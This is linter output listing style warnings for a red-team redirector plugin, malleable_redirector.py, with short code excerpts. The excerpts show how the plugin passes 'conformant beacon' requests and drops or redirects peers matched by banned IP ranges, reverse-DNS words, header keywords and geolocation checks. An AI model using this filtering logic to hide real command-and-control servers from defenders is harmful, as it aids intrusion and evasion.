help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1304:33
     |
1302 |                 self.logger.dbg('Altering URL to: "{}"'.format(newhost))
1303 |             else:
1304 |                 self.logger.dbg('Altering host header to: "{}"'.format(newhost))
     |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1305 |
1306 |             return self.redirect(req, newhost, malleable_meta)
     |
help: Convert to f-string

N806 Variable `peerIP` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1329:17
     |
1327 |                 ProxyPlugin.DynamicWhitelistFile, autocommit=True
1328 |             ) as mydict:
1329 |                 peerIP = self.get_peer_ip(req)
     |                 ^^^^^^
1330 |                 if peerIP not in mydict.get("whitelisted_ips", []):
1331 |                     key = "{}-{}".format(malleable_meta["section"], peerIP)
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1335:36
     |
1333 |                     mydict[key] = prev
1334 |
1335 |                     a = mydict.get("http-get-{}".format(peerIP), 0)
     |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1336 |                     b = mydict.get("http-post-{}".format(peerIP), 0)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1336:36
     |
1335 |                     a = mydict.get("http-get-{}".format(peerIP), 0)
1336 |                     b = mydict.get("http-post-{}".format(peerIP), 0)
     |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1337 |
1338 |                     a2 = int(
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1350:25
     |
1349 |   ΓÇª     self.logger.info(
1350 | / ΓÇª         "Connected peer sent {} valid http-get and {} valid http-post requests so far, out of {}/{} required to consider him tempoΓÇª
1351 | | ΓÇª             a, b, a2, b2
1352 | | ΓÇª         ),
     | |___________^
1353 |   ΓÇª         color="yellow",
1354 |   ΓÇª     )
     |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1356:21
     |
1354 |                       )
1355 |
1356 | /                     if a > a2:
1357 | |                         if b > b2:
     | |__________________________________^
1358 |                               self.logger.info(
1359 |                                   "Adding connected peer ({}) to a dynamic whitelist as it reached its thresholds: ({}, {})".format(
     |
help: Combine `if` statements using `and`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1359:33
     |
1357 |                           if b > b2:
1358 |                               self.logger.info(
1359 | /                                 "Adding connected peer ({}) to a dynamic whitelist as it reached its thresholds: ({}, {})".format(
1360 | |                                     peerIP, a, b
1361 | |                                 ),
     | |_________________________________^
1362 |                                   color="green",
1363 |                               )
     |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1376:13
     |
1374 |                 f"No Teamserver provided. Falling back to drop request strategy.: {s}"
1375 |             )
1376 |             raise Exception(str(e))
     |             ^^^^^^^^^^^^^^^^^^^^^^^
1377 |
1378 |         return self.redirect(req, ts, malleable_meta)
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1414:21
     |
1412 |             elif host_action == 2:
1413 |                 self.logger.dbg(
1414 |                     'Altering host header in response_handler to: "{}"'.format(newhost)
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1415 |                 )
1416 |                 del req.headers["Host"]
     |
help: Convert to f-string

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1418:29
     |
1416 |                 del req.headers["Host"]
1417 |                 req.headers["Host"] = newhost
1418 |                 req.headers[proxy2_metadata_headers["override_host_header"]] = newhost
     |                             ^^^^^^^^^^^^^^^^^^^^^^^
1419 |
1420 |         # A nifty hack to make the proxy2 believe we actually modified the response
     |

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1423:21
     |
1421 |         # so that the proxy will not encode it to gzip (or anything specified) and just
1422 |         # return the response as-is, in an "Content-Encoding: identity" kind of fashion
1423 |         res.headers[proxy2_metadata_headers["override_response_content_encoding"]] = (
     |                     ^^^^^^^^^^^^^^^^^^^^^^^
1424 |             "identity"
1425 |         )
     |

F841 Local variable `scheme` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1448:9
     |
1447 |         u = urlparse(req.uri)
1448 |         scheme, netloc, path = (
     |         ^^^^^^
1449 |             u.scheme,
1450 |             u.netloc,
     |
help: Remove assignment to unused variable `scheme`

F841 Local variable `netloc` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1448:17
     |
1447 |         u = urlparse(req.uri)
1448 |         scheme, netloc, path = (
     |                 ^^^^^^
1449 |             u.scheme,
1450 |             u.netloc,
     |
help: Remove assignment to unused variable `netloc`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1458:21
     |
1456 |         try:
1457 |             resolved = socket.gethostbyaddr(req.client_address[0])[0]
1458 |             peer += " ({})".format(resolved)
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^
1459 |         except:
1460 |             pass
     |
help: Convert to f-string

E722 Do not use bare `except`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1459:9
     |
1457 |             resolved = socket.gethostbyaddr(req.client_address[0])[0]
1458 |             peer += " ({})".format(resolved)
1459 |         except:
     |         ^^^^^^
1460 |             pass
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1464:17
     |
1462 |           if not quiet:
1463 |               self.logger.err(
1464 | /                 "[{} invalid request from {}] {} {}".format(
1465 | |                     todo, peer, req.method, path
1466 | |                 ),
     | |_________________^
1467 |                   color="cyan",
1468 |               )
     |
help: Convert to f-string

E712 Avoid equality comparisons to `True`; use `self.proxyOptions["log_dropped"]:` for truth checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1470:12
     |
1468 |             )
1469 |
1470 |         if self.proxyOptions["log_dropped"] == True:
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1471 |             req_headers = req.headers
1472 |             rb = req_body
     |
help: Replace with `self.proxyOptions["log_dropped"]`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1473:22
     |
1471 |             req_headers = req.headers
1472 |             rb = req_body
1473 |             if rb != None and len(rb) > 0:
     |                      ^^^^
1474 |                 if type(rb) == type(b""):
1475 |                     rb = rb.decode()
     |
help: Replace with `cond is not None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1474:20
     |
1472 |             rb = req_body
1473 |             if rb != None and len(rb) > 0:
1474 |                 if type(rb) == type(b""):
     |                    ^^^^^^^^^^^^^^^^^^^^^
1475 |                     rb = rb.decode()
1476 |                 rb = "\r\n" + rb
     |

UP003 [*] Use `bytes` instead of `type(...)`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1474:32
     |
1472 |             rb = req_body
1473 |             if rb != None and len(rb) > 0:
1474 |                 if type(rb) == type(b""):
     |                                ^^^^^^^^^
1475 |                     rb = rb.decode()
1476 |                 rb = "\r\n" + rb
     |
help: Replace `type(...)` with `bytes`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1485:33
     |
1484 |             if not quiet:
1485 |                 self.logger.err("\n\n{}".format(request), color="cyan")
     |                                 ^^^^^^^^^^^^^^^^^^^^^^^^
1486 |
1487 |         if self.proxyOptions["drop_action"] == "reset":
     |
help: Convert to f-string

F405 `DropConnectionException` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1488:20
     |
1487 |         if self.proxyOptions["drop_action"] == "reset":
1488 |             return DropConnectionException("Not a conformant beacon request.")
     |                    ^^^^^^^^^^^^^^^^^^^^^^^
1489 |
1490 |         elif self.proxyOptions["drop_action"] == "redirect":
     |

F405 `DontFetchResponseException` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1492:24
     |
1490 |         elif self.proxyOptions["drop_action"] == "redirect":
1491 |             if self.is_request:
1492 |                 return DontFetchResponseException("Not a conformant beacon request.")
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^
1493 |
1494 |             if res == None:
     |

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1494:23
     |
1492 |                 return DontFetchResponseException("Not a conformant beacon request.")
1493 |
1494 |             if res == None:
     |                       ^^^^
1495 |                 self.logger.err("Response handler received a None res object.")
1496 |                 return res_body
     |
help: Replace with `cond is None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1500:17
     |
1498 |             url = self.proxyOptions["action_url"]
1499 |             if (
1500 |                 type(self.proxyOptions["action_url"]) == list
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1501 |                 or type(self.proxyOptions["action_url"]) == tuple
1502 |             ) and len(self.proxyOptions["action_url"]) > 0:
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1501:20
     |
1499 |             if (
1500 |                 type(self.proxyOptions["action_url"]) == list
1501 |                 or type(self.proxyOptions["action_url"]) == tuple
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1502 |             ) and len(self.proxyOptions["action_url"]) > 0:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1509:24
     |
1507 |               res.response_version = "HTTP/1.1"
1508 |               res.reason = "Moved Permanently"
1509 |               res_body = """<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
     |  ________________________^
1510 | | <TITLE>301 Moved</TITLE></HEAD><BODY>
1511 | | <H1>301 Moved</H1>
1512 | | The document has moved
1513 | | <A HREF="{}">here</A>.
1514 | | </BODY></HTML>""".format(
1515 | |                 url
1516 | |             )
     | |_____________^
1517 |
1518 |               res.headers = {
     |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1543:18
     |
1541 |         req_headers = req.headers
1542 |         rb = req_body
1543 |         if rb != None and len(rb) > 0:
     |                  ^^^^
1544 |             if type(rb) == type(b""):
1545 |                 rb = rb.decode()
     |
help: Replace with `cond is not None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1544:16
     |
1542 |         rb = req_body
1543 |         if rb != None and len(rb) > 0:
1544 |             if type(rb) == type(b""):
     |                ^^^^^^^^^^^^^^^^^^^^^
1545 |                 rb = rb.decode()
1546 |             rb = "\r\n" + rb
     |

UP003 [*] Use `bytes` instead of `type(...)`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1544:28
     |
1542 |         rb = req_body
1543 |         if rb != None and len(rb) > 0:
1544 |             if type(rb) == type(b""):
     |                            ^^^^^^^^^
1545 |                 rb = rb.decode()
1546 |             rb = "\r\n" + rb
     |
help: Replace `type(...)` with `bytes`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1556:25
     |
1554 |         m.update(request.encode())
1555 |         h = m.hexdigest()
1556 |         self.logger.dbg("Requests's MD5 hash computed: {}".format(h))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1557 |
1558 |         return h
     |
help: Convert to f-string

N803 Argument name `peerIP` should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1561:15
     |
1560 |     def validatePeerAndHttpHeaders(
1561 |         self, peerIP, ts, req, req_body, res, res_body, parsedJson
     |               ^^^^^^
1562 |     ):
1563 |         respJson = {}
     |

N803 Argument name `parsedJson` should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1561:57
     |
1560 |     def validatePeerAndHttpHeaders(
1561 |         self, peerIP, ts, req, req_body, res, res_body, parsedJson
     |                                                         ^^^^^^^^^^
1562 |     ):
1563 |         respJson = {}
     |

N806 Variable `respJson` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1563:9
     |
1561 |         self, peerIP, ts, req, req_body, res, res_body, parsedJson
1562 |     ):
1563 |         respJson = {}
     |         ^^^^^^^^
1564 |         returnJson = parsedJson != None and res != None
     |

N806 Variable `returnJson` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1564:9
     |
1562 |     ):
1563 |         respJson = {}
1564 |         returnJson = parsedJson != None and res != None
     |         ^^^^^^^^^^
1565 |
1566 |         ipLookupDetails = None
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1564:36
     |
1562 |     ):
1563 |         respJson = {}
1564 |         returnJson = parsedJson != None and res != None
     |                                    ^^^^
1565 |
1566 |         ipLookupDetails = None
     |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1564:52
     |
1562 |     ):
1563 |         respJson = {}
1564 |         returnJson = parsedJson != None and res != None
     |                                                    ^^^^
1565 |
1566 |         ipLookupDetails = None
     |
help: Replace with `cond is not None`

N806 Variable `ipLookupDetails` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1566:9
     |
1564 |         returnJson = parsedJson != None and res != None
1565 |
1566 |         ipLookupDetails = None
     |         ^^^^^^^^^^^^^^^
1567 |         userAgentValue = req.headers.get("User-Agent")
1568 |         respJson["drop_type"] = self.proxyOptions["drop_action"]
     |

N806 Variable `userAgentValue` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1567:9
     |
1566 |         ipLookupDetails = None
1567 |         userAgentValue = req.headers.get("User-Agent")
     |         ^^^^^^^^^^^^^^
1568 |         respJson["drop_type"] = self.proxyOptions["drop_action"]
1569 |         respJson["action_url"] = self.proxyOptions["action_url"]
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1572:62
     |
1571 |         if (
1572 |             self.proxyOptions["whitelisted_ip_addresses"] != None
     |                                                              ^^^^
1573 |             and len(self.proxyOptions["whitelisted_ip_addresses"]) > 0
1574 |         ):
     |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1578:27
     |
1576 |                   cidr = cidr.strip()
1577 |                   if ipaddress.ip_address(peerIP) in ipaddress.ip_network(cidr, False):
1578 |                       msg = "[ALLOW, {}, reason:1, {}] peer's IP address is whitelisted: ({})".format(
     |  ___________________________^
1579 | |                         ts, peerIP, cidr
1580 | |                     )
     | |_____________________^
1581 |
1582 |                       if returnJson:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1604:27
     |
1602 |               with SqliteDict(ProxyPlugin.DynamicWhitelistFile) as mydict:
1603 |                   if peerIP in mydict.get("whitelisted_ips", []):
1604 |                       msg = "[ALLOW, {}, reason:2, {}] Peer's IP was added dynamically to a whitelist based on a number of allowed reqΓÇª
     |  ___________________________^
1605 | |                         ts, peerIP
1606 | |                     )
     | |_____________________^
1607 |
1608 |                       if returnJson:
     |
help: Convert to f-string

N806 Variable `reverseIp` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1624:21
     |
1622 |             for cidr, _comment in self.banned_ips.items():
1623 |                 if ipaddress.ip_address(peerIP) in ipaddress.ip_network(cidr, False):
1624 |                     reverseIp = ""
     |                     ^^^^^^^^^
1625 |                     try:
1626 |                         reverseIp = socket.gethostbyaddr(peerIP)[0]
     |

N806 Variable `reverseIp` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1626:25
     |
1624 |                     reverseIp = ""
1625 |                     try:
1626 |                         reverseIp = socket.gethostbyaddr(peerIP)[0]
     |                         ^^^^^^^^^
1627 |                     except:
1628 |                         pass
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1627:21
     |
1625 |                     try:
1626 |                         reverseIp = socket.gethostbyaddr(peerIP)[0]
1627 |                     except:
     |                     ^^^^^^
1628 |                         pass
     |

N806 Variable `blockAnyway` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1630:21
     |
1628 |                         pass
1629 |
1630 |                     blockAnyway = True
     |                     ^^^^^^^^^^^
1631 |                     entry = ""
     |

N806 Variable `blockAnyway` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1635:29
     |
1633 |                     for w in OVERRIDE_BANNED_AGENTS:
1634 |                         if w.lower() in reverseIp.lower():
1635 |                             blockAnyway = False
     |                             ^^^^^^^^^^^
1636 |                             entry = w
1637 |                             break
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1644:31
     |
1642 |                               comment = " - " + _comment
1643 |
1644 |                           msg = '[DROP, {}, reason:4a, {}] Peer\'s IP address is blacklisted: ({}{} - rev_ip: "{}")'.format(
     |  _______________________________^
1645 | |                             ts, peerIP, cidr, comment, reverseIp
1646 | |                         )
     | |_________________________^
1647 |
1648 |                           if returnJson:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1690:33
     |
1688 |                           if a or b:
1689 |                               self.logger.dbg(
1690 | /                                 'Peer\'s reverse-IP lookup would be banned because of word "{}" but was whitelisted.'.format(
1691 | |                                     part
1692 | |                                 )
     | |_________________________________^
1693 |                               )
1694 |                               whitelisted = True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1697:31
     |
1695 |                               break
1696 |
1697 |                           msg = '[DROP, {}, reason:4b, {}] peer\'s reverse-IP lookup contained banned word: "{}"'.format(
     |  _______________________________^
1698 | |                             ts, peerIP, part
1699 | |                         )
     | |_________________________^
1700 |
1701 |                           if returnJson:
     |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1715:33
     |
1713 |                             )
1714 |
1715 |             except Exception as e:
     |                                 ^
1716 |                 pass
     |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1745:37
     |
1743 |   ΓÇª     if a or b or c:
1744 |   ΓÇª         self.logger.dbg(
1745 | / ΓÇª             'HTTP header name would be banned because of word "{}" but was overridden by whitelist file entries.'.format(
1746 | | ΓÇª                 kv1
1747 | | ΓÇª             )
     | |_______________^
1748 |   ΓÇª         )
1749 |   ΓÇª         whitelisted = True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1752:35
     |
1750 |                                   break
1751 |
1752 |                               msg = '[DROP, {}, reason:2, {}] HTTP header name contained banned word: "{}" ({}: {})'.format(
     |  ___________________________________^
1753 | |                                 ts, peerIP, kv1, kv, vv
1754 | |                             )
     | |_____________________________^
1755 |
1756 |                               if returnJson:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1789:37
     |
1787 |   ΓÇª     if a or b or c:
1788 |   ΓÇª         self.logger.dbg(
1789 | / ΓÇª             'HTTP header value would be banned because of word "{}" but was overridden by whitelist file entries.'.format(
1790 | | ΓÇª                 vv1
1791 | | ΓÇª             )
     | |_______________^
1792 |   ΓÇª         )
1793 |   ΓÇª         whitelisted = True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1796:35
     |
1794 |                                   break
1795 |
1796 |                               msg = '[DROP, {}, reason:3, {}] HTTP header value contained banned word: "{}" ({}: {})'.format(
     |  ___________________________________^
1797 | |                                 ts, peerIP, vv1, kv, vv
1798 | |                             )
     | |_____________________________^
1799 |
1800 |                               if returnJson:
     |
help: Convert to f-string

N806 Variable `ipLookupDetails` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1818:17
     |
1816 |         if self.proxyOptions["verify_peer_ip_details"]:
1817 |             try:
1818 |                 ipLookupDetails = self.ipLookupHelper.lookup(peerIP)
     |                 ^^^^^^^^^^^^^^^
1819 |                 whitelisted = False
     |

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1821:17
     |
1819 |                   whitelisted = False
1820 |
1821 | /                 if ipLookupDetails and len(ipLookupDetails) > 0:
1822 | |                     if "organization" in ipLookupDetails.keys():
     | |________________________________________________________________^
1823 |                           for orgWord in ipLookupDetails["organization"]:
1824 |                               if whitelisted:
     |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1822:24
     |
1821 |                 if ipLookupDetails and len(ipLookupDetails) > 0:
1822 |                     if "organization" in ipLookupDetails.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1823 |                         for orgWord in ipLookupDetails["organization"]:
1824 |                             if whitelisted:
     |
help: Remove `.keys()`

N806 Variable `orgWord` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1823:29
     |
1821 |                 if ipLookupDetails and len(ipLookupDetails) > 0:
1822 |                     if "organization" in ipLookupDetails.keys():
1823 |                         for orgWord in ipLookupDetails["organization"]:
     |                             ^^^^^^^
1824 |                             if whitelisted:
1825 |                                 break
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1843:45
     |
1841 |   ΓÇª     if a or b:
1842 |   ΓÇª         self.logger.dbg(
1843 | / ΓÇª             'IP lookup organization field "{}" would be banned because of word "{}" but was overridden by whitelist file entries.'ΓÇª
1844 | | ΓÇª                 orgWord, word
1845 | | ΓÇª             )
     | |_______________^
1846 |   ΓÇª         )
1847 |   ΓÇª         whitelisted = True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1850:43
     |
1848 |                                           break
1849 |
1850 |                                       msg = '[DROP, {}, reason:4c, {}] peer\'s IP lookup organization field ({}) contained banned wordΓÇª
     |  ___________________________________________^
1851 | |                                         ts, peerIP, orgWord, word
1852 | |                                     )
     | |_____________________________________^
1853 |
1854 |                                       if returnJson:
     |
help: Convert to f-string

F523 `.format` call has unused arguments at position(s): 7
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1881:27
     |
1879 |               try:
1880 |                   if not self.ipGeolocationDeterminer.determine(ipLookupDetails):
1881 |                       msg = '[DROP, {}, reason:4d, {}] peer\'s IP geolocation ("{}", "{}", "{}", "{}", "{}") DID NOT met expected condΓÇª
     |  ___________________________^
1882 | |                         ts,
1883 | |                         peerIP,
1884 | |                         ipLookupDetails["continent"],
1885 | |                         ipLookupDetails["continent_code"],
1886 | |                         ipLookupDetails["country"],
1887 | |                         ipLookupDetails["country_code"],
1888 | |                         ipLookupDetails["city"],
1889 | |                         ipLookupDetails["timezone"],
1890 | |                     )
     | |_____________________^
1891 |
1892 |                       if returnJson:
     |
help: Remove extra positional arguments at position(s): 7

N806 Variable `metaAnalysis` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1916:21
     |
1914 |                 self.logger.dbg("Analysing IP Geo metadata keywords...")
1915 |                 try:
1916 |                     metaAnalysis = self.ipGeolocationDeterminer.validateIpGeoMetadata(
     |                     ^^^^^^^^^^^^
1917 |                         ipLookupDetails, BANNED_AGENTS, OVERRIDE_BANNED_AGENTS
1918 |                     )
     |

E712 Avoid equality comparisons to `False`; use `not metaAnalysis[0]:` for false checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1920:24
     |
1918 |                     )
1919 |
1920 |                     if metaAnalysis[0] == False:
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^
1921 |                         a = metaAnalysis[1].lower() in OVERRIDE_BANNED_AGENTS
1922 |                         b = any(x in metaAnalysis[1] for x in OVERRIDE_BANNED_AGENTS)
     |
help: Replace with `not metaAnalysis[0]`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1925:33
     |
1923 |   ΓÇª     if a or b:
1924 |   ΓÇª         self.logger.dbg(
1925 | / ΓÇª             'Peer\'s IP geolocation metadata would be banned because it contained word "{}" but was overridden by whitelist file.'ΓÇª
1926 | | ΓÇª                 metaAnalysis[1]
1927 | | ΓÇª             )
     | |_______________^
1928 |   ΓÇª         )
     |
help: Convert to f-string

F523 `.format` call has unused arguments at position(s): 8
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1931:35
     |
1930 |                           else:
1931 |                               msg = '[DROP, {}, reason:4e, {}] Peer\'s IP geolocation metadata ("{}", "{}", "{}", "{}", "{}") containeΓÇª
     |  ___________________________________^
1932 | |                                 ts,
1933 | |                                 peerIP,
1934 | |                                 ipLookupDetails["continent"],
1935 | |                                 ipLookupDetails["continent_code"],
1936 | |                                 ipLookupDetails["country"],
1937 | |                                 ipLookupDetails["country_code"],
1938 | |                                 ipLookupDetails["city"],
1939 | |                                 ipLookupDetails["timezone"],
1940 | |                                 metaAnalysis[1],
1941 | |                             )
     | |_____________________________^
1942 |
1943 |                               if returnJson:
     |
help: Remove extra positional arguments at position(s): 8

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1965:19
     |
1963 |           if returnJson:
1964 |
1965 |               msg = "[ALLOW, {}, reason:99, {}] Peer IP and HTTP headers did not contain anything suspicious.".format(
     |  ___________________^
1966 | |                 ts, peerIP
1967 | |             )
     | |_____________^
1968 |
1969 |               if not ipLookupDetails or (
     |
help: Convert to f-string

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1970:17
     |
1969 |             if not ipLookupDetails or (
1970 |                 type(ipLookupDetails) == dict and len(ipLookupDetails) == 0
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1971 |             ):
1972 |                 respJson["ipgeo"] = self.printPeerInfos(peerIP, True)
     |

N803 Argument name `peerIP` should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1983:36
     |
1981 |             return (False, False)
1982 |
1983 |     def processProxyPass(self, ts, peerIP, req, processNodrops):
     |                                    ^^^^^^
1984 |         if (
1985 |             self.proxyOptions["proxy_pass"] != None
     |

N803 Argument name `processNodrops` should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1983:49
     |
1981 |             return (False, False)
1982 |
1983 |     def processProxyPass(self, ts, peerIP, req, processNodrops):
     |                                                 ^^^^^^^^^^^^^^
1984 |         if (
1985 |             self.proxyOptions["proxy_pass"] != None
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1985:48
     |
1983 |     def processProxyPass(self, ts, peerIP, req, processNodrops):
1984 |         if (
1985 |             self.proxyOptions["proxy_pass"] != None
     |                                                ^^^^
1986 |             and len(self.proxyOptions["proxy_pass"]) > 0
1987 |             and self.proxyOptions["policy"]["allow_proxy_pass"]
     |
help: Replace with `cond is not None`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1996:17
     |
1994 |                   opts = ""
1995 |
1996 | /                 if processNodrops:
1997 | |                     if ("options" not in entry.keys()) or (
1998 | |                         "nodrop" not in entry["options"].keys()
1999 | |                     ):
     | |______________________^
2000 |                           continue
     |
help: Combine `if` statements using `and`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1997:25
     |
1996 |                 if processNodrops:
1997 |                     if ("options" not in entry.keys()) or (
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1998 |                         "nodrop" not in entry["options"].keys()
1999 |                     ):
     |
help: Remove `.keys()`

